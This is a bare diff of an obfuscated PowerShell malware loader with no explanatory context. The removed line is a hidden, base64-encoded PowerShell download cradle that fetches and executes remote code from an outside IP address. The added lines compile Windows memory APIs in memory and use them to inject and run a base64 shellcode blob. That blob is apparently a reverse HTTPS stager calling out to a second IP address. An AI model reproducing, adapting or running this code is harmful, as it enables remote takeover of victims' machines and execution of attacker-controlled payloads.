@@ -1,1 +1,35 @@
-powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABwAGMATgBfAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHAAYwBOAF8ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABwAGMATgBfAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAAuADIAMwAxAC4AMwA1AC4AMgAyADcAOgA0ADQAMwAvADkAbgAwADMASwBqAC8AbQBVAFUAQwA0ADEAYgAxAHQAbQB5ADYAeAA3ACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA0AC4AMgAzADEALgAzADUALgAyADIANwA6ADQANAAzAC8AOQBuADAAMwBLAGoAJwApACkAOwA=
+Set-StrictMode -Version 2
+$s4UbG = @"
+        using System;
+        using System.Runtime.InteropServices;
+        namespace x33d {
+                public class func {
+                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
+                        [Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
+                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
+                        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+                        [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
+                        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+                        [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
+                }
+        }
+"@
+
+$n6W_ = New-Object Microsoft.CSharp.CSharpCodeProvider
+$rLxa = New-Object System.CodeDom.Compiler.CompilerParameters
+$rLxa.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$rLxa.GenerateInMemory = $True
+$f8Tt = $n6W_.CompileAssemblyFromSource($rLxa, $s4UbG)
+
+[Byte[]]$nKXS4 = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQi1ggUItIGAHThcl0PEmLNIsx/wHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daHR0cABod2luaFRoTHcmB//VaHQzMgBoY3J5cFRoTHcmB//VMdtTU1NTU2gEH527/9VQU2i7AQAA6CkCAABoAHQAdABwAHMAOgAvAC8ANQAxAC4AMQAyADQALgAxADgAOAAuADEAOAAxAC8ATABiAHUAcABtAEIAMABvAHgAXwA0AEYAWABnAFIAZgBaAHMAXwBnAFYAdwBZAFYAYwBEAGwASwBqAGIAdQBJAGwAUQBuAHkAbwBUADEAZABqAHQAbgBTAGwAcQBvADUANwA5AF8ATwBpAHkASABOAEkAUwBLAGcAMQBtAEsAbwBUAGcAaQBKAFcAUgBOADIAMgBWAHgASwA4AEoAAACDxyxQaEabHsL/1WgAAYAAU1NTV1NQaJgQs1v/1ZaD7BCJ4FeJx1doIacLYP/VhcB0TYtHBIXAdCpag+osagFTU1BqA2oDieCD7AyJ51dQUo1EJED/MGja3epJ/9WFwHQe6w+LRwiFwHQVagRYAcdIiQdqDFdqJlZo01idzv/VaAAzAACJ4GoEUGofVmjTWJ3O/9VqCl9TU1NTU1NWaJVYu5H/1YXAdQhPdevo0QAAAGoEieFqAInjUVNqTlZoeAQvJ//VhcB042oUieErIYnnUVdqA/8zaC1uqcP/1YXAdMroFAAAANIsJLUYnADZjFHAITDlskcIKp/vW2oEWYnKiwM7Bw+Fof///wHTAdfi8DHbU1ZoBYidcP/VhcAPhIj///9qQGgAEAAAaAAAQABTaFikU+X/1ZNTU4nnV2gAIAAAU1ZobCkkfv/VhcAPhFj///+LBwHDhcB14VjDX+id/v//NQAxAC4AMQAyADQALgAxADgAOAAuADEAOAAxAAAAu/C1olZqAFP/1Q==")
+[Uint32]$eBPL = 0
+
+$gI = [x33d.func]::VirtualAlloc(0, $nKXS4.Length + 1, [x33d.func+AllocationType]::Reserve -bOr [x33d.func+AllocationType]::Commit, [x33d.func+MemoryProtection]::ReadWrite)
+if ([Bool]!$gI) { $global:result = 3; return }
+[System.Runtime.InteropServices.Marshal]::Copy($nKXS4, 0, $gI, $nKXS4.Length)
+
+if ([x33d.func]::VirtualProtect($gI,[Uint32]$nKXS4.Length + 1, [x33d.func+MemoryProtection]::Execute, [Ref]$eBPL) -eq $true ) {
+        [IntPtr] $zi = [x33d.func]::CreateThread(0,0,$gI,0,0,0)
+        if ([Bool]!$zi) { $global:result = 7; return }
+        $eNg = [x33d.func]::WaitForSingleObject($zi, [x33d.func+Time]::Infinite)
+}
